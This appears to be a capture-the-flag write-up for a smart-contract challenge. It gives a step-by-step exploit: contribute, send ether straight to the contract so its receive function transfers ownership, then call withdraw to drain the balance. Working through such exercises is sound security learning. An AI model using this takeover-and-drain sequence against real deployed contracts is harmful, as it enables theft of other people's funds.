### Description

Take ownership of the contract and reduce balance to 0

### Solution

The receive function of the contract is the attack point, when contributing more than 0 and then using this function it transfers ownership, after this you can withdraw the funds

## Commands

await contract.contribute({value: 0.01})
sendTransaction({to: instance, from: player, value: 0.0009})
await getBalance(instance) // Has eth
await contract.withdraw()
await getBalance(instance) // Eth has been withdrawed
